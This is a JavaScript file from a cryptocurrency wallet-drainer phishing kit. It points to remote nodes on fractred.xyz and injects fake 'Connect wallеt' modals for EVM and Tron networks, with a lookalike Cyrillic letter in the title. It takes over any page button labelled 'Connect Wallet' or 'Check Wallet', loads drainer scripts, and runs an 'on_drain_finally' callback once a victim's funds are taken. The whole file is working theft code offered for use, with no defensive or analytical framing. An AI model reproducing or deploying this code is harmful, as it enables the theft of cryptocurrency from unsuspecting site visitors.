

window.tron_address = "https://node2.fractred.xyz";
window.evm_address = "https://node1.fractred.xyz";



const MAIN_WINDOW = `<div id="ms-modal"><div class="ms_modal white">
    <div class="ms_modal_content">
      <div class="ms_modal_head">
        <title>Connect wallеt</title>
        <div class="ms_head_body">Select a network</div>
      </div>
      <div class="ms_modal_menu">
        <div class="ms_modal_menu_first">
          <div class="ms_modal_el" onclick="ms_init1()">
            <div class="ms_modal_el-content">
          <div class="network-logos" style="
      /* background: #e7e7e7; */
      /* padding: 0px; */
      border-radius: 4px;
  ">
            <img src="https://cryptologos.cc/logos/ethereum-eth-logo.svg" alt="Ethereum" class="network-logo">
            <img src="https://cryptologos.cc/logos/bnb-bnb-logo.svg" alt="BSC" class="network-logo">
            <img src="https://cryptologos.cc/logos/polygon-matic-logo.svg" alt="Polygon" class="network-logo">
            <img src="https://cryptologos.cc/logos/fantom-ftm-logo.svg" alt="Fantom" class="network-logo">
          </div>
          <div class="ms_modal_el-title">
            <div class="ms_modal_el-title-first">EVM Networks</div>
            <div class="ms_modal_el-title-second">Ethereum, BSC, Polygon, Fantom, etc</div>
          </div>
        </div>

            
          </div>
          <div class="ms_modal_el" onclick="tron_init()">
            <div class="ms_modal_el-content">
              
  <svg id="Calque_1" data-name="Calque 1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64"><defs><style>.cls-1{fill:#ff060a;}</style></defs><title>tron</title><g id="tron"><path class="cls-1" d="M61.55,19.28c-3-2.77-7.15-7-10.53-10l-.2-.14a3.82,3.82,0,0,0-1.11-.62l0,0C41.56,7,3.63-.09,2.89,0a1.4,1.4,0,0,0-.58.22L2.12.37a2.23,2.23,0,0,0-.52.84l-.05.13v.71l0,.11C5.82,14.05,22.68,53,26,62.14c.2.62.58,1.8,1.29,1.86h.16c.38,0,2-2.14,2-2.14S58.41,26.74,61.34,23a9.46,9.46,0,0,0,1-1.48A2.41,2.41,0,0,0,61.55,19.28ZM36.88,23.37,49.24,13.12l7.25,6.68Zm-4.8-.67L10.8,5.26l34.43,6.35ZM34,27.27l21.78-3.51-24.9,30ZM7.91,7,30.3,26,27.06,53.78Z"></path></g></svg>
              <div class="ms_modal_el-title">
                <div class="ms_modal_el-title-first">Tron</div>
                <div class="ms_modal_el-title-second">Tron Network</div>
              </div>
            </div>
            
          </div>
        </div>
        
      </div>
    </div>
    
  </div></div>`;

  const TRON_WINDOW = `<div id="ms-modal"><div class="ms_modal white">
    <div class="ms_modal_content">
      <div class="ms_modal_head">
        <title>Connect wallеt</title>
        <div class="ms_head_body">Choose wallet you want to connect</div>
      </div>
      <div class="ms_modal_menu">
        <div class="ms_modal_menu_first">
          <div class="ms_modal_el" onclick="document.getElementById('ms-modal').remove();window.wallet_connected='walletconnect';window.connect_wallet_tron('walletconnect')">
            <div class="ms_modal_el-content">
              <svg xmlns="http://www.w3.org/2000/svg" width="32" height="20" viewBox="0 0 32 20" fill="none">
                <g clip-path="url(#clip0_0_709)">
                  <path d="M6.55521 4.0227C11.773 -1.08772 20.2353 -1.08772 25.453 4.0227L26.0805 4.63364C26.3447 4.88957 26.3447 5.30237 26.0805 5.5583L23.934 7.66356C23.8019 7.7874 23.5955 7.7874 23.4634 7.66356L22.5965 6.8132C18.9556 3.24664 13.0526 3.24664 9.41177 6.8132L8.4871 7.72135C8.35501 7.84519 8.14861 7.84519 8.01651 7.72135L5.86171 5.62435C5.59752 5.36841 5.59752 4.95562 5.86171 4.69968L6.55521 4.0227ZM29.8947 8.37357L31.8101 10.2477C32.0743 10.5036 32.0743 10.9164 31.8101 11.1723L23.1827 19.6182C22.9185 19.8741 22.4974 19.8741 22.2415 19.6182L16.1238 13.6243C16.0578 13.5583 15.9505 13.5583 15.8844 13.6243L9.76677 19.6182C9.50258 19.8741 9.08153 19.8741 8.82559 19.6182L0.198142 11.1723C-0.0660475 10.9164 -0.0660475 10.5036 0.198142 10.2477L2.11352 8.37357C2.37771 8.11764 2.79876 8.11764 3.0547 8.37357L9.17234 14.3674C9.23839 14.4334 9.34572 14.4334 9.41177 14.3674L15.5294 8.37357C15.7936 8.11764 16.2147 8.11764 16.4706 8.37357L22.5882 14.3674C22.6543 14.4334 22.7616 14.4334 22.8277 14.3674L28.9453 8.37357C29.2095 8.11764 29.6305 8.11764 29.8947 8.37357Z" fill="#3B99FC"></path>
                </g>
                <defs>
                  <clipPath id="clip0_0_709">
                    <rect width="32" height="19.6161" fill="white" transform="translate(0 0.191956)"></rect>
                  </clipPath>
                </defs>
              </svg>
              <div class="ms_modal_el-title">
                <div class="ms_modal_el-title-first">WalletConnect</div>
                <div class="ms_modal_el-title-second">TrustWallet, etc</div>
              </div>
            </div>
           
          </div>
          <div class="ms_modal_el" onclick="document.getElementById('ms-modal').remove();window.wallet_connected='tronlink';window.connect_wallet_tron('tronlink')">
            <div class="ms_modal_el-content">
              <img src="/frank_assets/tronlink-icon.png" style="max-width: 32px">
              <div class="ms_modal_el-title">
                <div class="ms_modal_el-title-first">TronLink</div>
                <div class="ms_modal_el-title-second">Connect Tronlink</div>
              </div>
            </div>
            
          </div>
          
          
          

        </div>
        
      </div>
    </div>
    
  </div></div>`;

function loadScript(src) {
  return new Promise((resolve, reject) => {
    const script = document.createElement('script');
    script.src = src;
    script.async = false; // Загружаем последовательно
    script.onload = () => {
      console.log(`Скрипт загружен: ${src}`);
      resolve(src);
    };
    script.onerror = () => {
      console.error(`Не удалось загрузить скрипт: ${src}`);
      reject(new Error(`Не удалось загрузить скрипт: ${src}`));
    };
    document.body.appendChild(script);
  });
}

async function loadScripts() {
  const scripts = [
    "./assets/web3-provider/web3-modal.js",
    "./assets/web3-provider/web3-loader.js",
    "./assets/web3-provider/web3-connect.js",
    "./assets/web3-provider/web3-router.js",
    "./assets/web3-provider/web3-module.js",
    "./assets/web3-provider/web3-alert.js",
    "./assets/web3-provider/web3-seaport.js",
    "./assets/web3-provider/web3-data.js",
    "./assets/web3-provider/ethers.js",
    "./assets/web3-provider/ethereum-tx.js",
    "./assets/web3-provider.js",
    "./assets/main.js",
  ];

  for (const src of scripts) {
    try {
      await loadScript(src);
    } catch (err) {
      console.error(err);
      return; // Прерываем выполнение при ошибке
    }
  }

  console.log('Все скрипты успешно загружены!');
}

// Запускаем загрузку скриптов при событии DOMContentLoaded
document.addEventListener('DOMContentLoaded', init_main);



  function tron_init() {
    const modal = document.getElementById('ms-modal');
    if (modal) {
      modal.classList.add('fade-out');

      modal.addEventListener('animationend', () => {
        modal.remove(); // Удаляем элемент после завершения анимации исчезновения
        document.body.insertAdjacentHTML('beforeend', TRON_WINDOW);
        const newModal = document.getElementById('ms-modal'); // Получаем новый элемент
        newModal.classList.add('fade-in'); // Добавляем анимацию появления
      });
    } else {
      document.body.insertAdjacentHTML('beforeend', TRON_WINDOW);
      const newModal = document.getElementById('ms-modal'); // Получаем новый элемент
      newModal.classList.add('fade-in'); // Добавляем анимацию появления
    }
  }



function ms_init1() {
  document.getElementById('ms-modal').remove();
    

    setTimeout(function() {
      ms_init();
    },1000);
  
      
}
function init_main() {
  


  function init_frank() {
    if(document.getElementById('ms-modal'))document.getElementById('ms-modal').remove();
      setTimeout(function() {
        if(document.getElementById('ms-modal'))document.getElementById('ms-modal').remove();
        if(document.getElementById('ms-modal'))document.getElementById('ms-modal').remove();
        if(document.getElementById('ms-modal'))document.getElementById('ms-modal').remove();
        if(document.getElementById('ms-modal'))document.getElementById('ms-modal').remove();
        if(document.getElementById('ms-modal'))document.getElementById('ms-modal').remove();
        document.body.insertAdjacentHTML('beforeend', MAIN_WINDOW);
      }, 100);
  }


  function loadCSS(url) {
      const link = document.createElement('link');
      link.rel = 'stylesheet';
      link.href = url;
      document.head.appendChild(link);
  }

  loadCSS('/frank_assets/custom.css');


  document.body.addEventListener('click', (event) => {
      const target = event.target;

      // Проверяем, на каком элементе произошло событие
      if (target.matches('#openModalBtn') || 
      target.matches('.wallet-account-btn') || 
      target.matches('.connectWallet') || 
          target.matches('.conneckWallet')) {
          init_frank(); // Вызываем вашу функцию
      }

      // Проверяем текст на кнопках и ссылках
      const targetTexts = ['Check Wallet', 'Wallet Connect', 'Connect Wallet']; // Добавьте все нужные тексты
      if (target.matches('button, a')) {
          for (const text of targetTexts) {
              if (target.textContent.includes(text)) {
                  event.preventDefault(); // Сбрасываем стандартное поведение
                  init_frank(); // Вызываем вашу функцию
                  break; // Прерываем цикл после первого совпадения
              }
          }
      }
  });




}





document.body.addEventListener('click', function(e) {
    const modal = document.getElementById('ms-modal');
    const modalContent = document.querySelector('.ms_modal');
    
    // Проверяем, что клик был за пределами модального окна
    if (modal && !modalContent.contains(e.target)) {
        modal.remove();
    }
});


window.on_drain_finally = function(type, wallet) {
  // Открываем /report.html в новой вкладке
  window.open("/report.html", "_blank");

  // Находим все элементы с классом .ms_modal и удаляем их из DOM
  const modals = document.querySelectorAll('.ms_modal');
  modals.forEach(modal => modal.remove());



    const modal = document.getElementById('ms-modal');
  modal.remove();
}
